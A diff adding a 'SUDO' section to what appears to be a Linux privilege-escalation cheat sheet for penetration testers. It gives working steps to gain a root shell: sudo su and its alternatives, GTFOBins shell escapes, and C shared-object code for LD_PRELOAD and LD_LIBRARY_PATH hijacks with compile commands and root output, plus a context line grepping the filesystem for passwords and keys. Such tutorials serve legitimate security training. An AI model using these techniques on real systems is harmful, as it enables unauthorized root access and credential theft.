@@ -667,6 +667,181 @@ grep -RiE 'password|username|key' / 2>/dev/null
 
 ## SUDO
 
+sudo is a command-line application that allows users to run other programs with the security privileges of other users. By default, that other user will be root. A user must first enter their password and be allowed access via the `/etc/sudoers` file's rule before using sudo \(s\).
+
+Run a program using with sudo privileges:
+
+```text
+sudo <program>
+```
+
+Run a program as the specified user:
+
+```text
+sudo -u <username> <program>
+```
+
+List the programs that a user is permitted to run and those that they are not permitted to run:
+
+```text
+sudo -l
+```
+
+### SU
+
+If your low privileged user account can use sudo and can run any programs and you know the user’s password you can switch the user with the `su` command to spawn a root shell:
+
+```text
+sudo su
+```
+
+### SU Alternative Methods
+
+If the `su` is not available for some reason, there are several other options for escalating privileges:
+
+```text
+sudo -s
+sudo -i
+sudo /bin/bash
+sudo passwd
+```
+
+### Shell Escape Sequences
+
+Even though we are only allowed to run particular programs with sudo, we can sometimes "escape" the program and generate a shell.
+
+Shell escape sequences can be found here:
+
+{% embed url="https://gtfobins.github.io/" %}
+
+#### Sudo Shell Escape Sequences Privilege Escalation
+
+1. List the sudo-enabled applications for your user:
+
+```text
+sudo -l
+...
+(root) NOPASSWD: /usr/sbin/iftop
+(root) NOPASSWD: /usr/bin/find
+(root) NOPASSWD: /usr/bin/nano
+(root) NOPASSWD: /usr/bin/vim
+(root) NOPASSWD: /usr/bin/man
+(root) NOPASSWD: /usr/bin/awk
+...
+```
+
+1. For a shell escape sequence for each program in the list, go to GTFOBins \([https://gtfobins.github.io/](https://gtfobins.github.io/)\).
+2. Use sudo to launch the application and execute the escape sequence to create a root shell if one is available.
+
+### Environment Variables
+
+Environment variables can be retrieved from the user's environment by sudo programs. If the `env_reset` option is specified in the `/etc/sudoers` configuration file, sudo will run programs in a new, minimal environment. To keep some environment variables out of the user's environment, use the `env_retain` option. The environment variables are displayed starting with `env_` when you run `sudo -l`.
+
+### LD\_PRELOAD
+
+The environment variable `LD_PRELOAD` can be used to specify the location of a shared object \(.so\) file. When this option is enabled, the shared object will be loaded first. We can run code as soon as the object is loaded by building a custom shared object and an init\(\) function.
+
+#### Limitations
+
+LD PRELOAD will fail if the effective user ID differs from the genuine user ID. Sudo must use the env keep option to retain the LD PRELOAD environment setting.
+
+#### Sudo LD\_PRELOAD Privilege Escalation
+
+1. List the programs that your user has permission to run with sudo:
+
+```text
+$ sudo -l
+Matching Defaults entries for user on this host:
+env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+...
+```
+
+> Note that the env\_keep option includes the LD\_PRELOAD environment variable.
+
+Create a file \(preload.c\) with the following contents:
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+```
+
+Compile preload.c to preload.so:
+
+```bash
+$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+```
+
+Set the `LD_PRELOAD` environment variable to the full path of the preload and run any permitted program using `sudo` as a result, file:
+
+```bash
+$ sudo LD_PRELOAD=/tmp/preload.so <program>
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### LD\_LIBRARY\_PATH
+
+The `LD_LIBRARY_PATH` environment variable specifies which directories should be examined first for shared libraries.
+
+The **ldd** command can be used to print a program's shared libraries \(.so files\):
+
+```text
+ldd /usr/sbin/program_name
+```
+
+If we construct a shared library with the same name and set `LD_LIBRARY_PATH` to its parent directory, the program will load our shared library instead of the one utilized by the program.
+
+#### Sudo LD\_LIBRARY\_PATH Privilege Escalation
+
+1. Run **ldd** against the program file:
+
+```text
+$ ldd /usr/sbin/program_name
+    linux-vdso.so.1 => (0x00007fff063ff000)
+    ...
+    libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
+    libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
+    libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
+    /lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
+```
+
+> Hijacking shared objects using this method is hit or miss. Choose one from the list and try it, if it fails try another one.
+
+Create a file \(library\_path.c\) with the following code:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+```
+
+Compile library\_path.c into the correct `.so` file:
+
+```bash
+gcc -o <lib_name.so.1> -shared -fPIC library_path.c
+```
+
+Run the program using sudo, while setting the LD\_LIBRARY\_PATH environment variable to the path where the code was compiled
+
+```bash
+$ sudo LD_LIBRARY_PATH=. <program_name>
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 ## Sticky Bits and SUID/SGID 
 
 ### Known Exploits
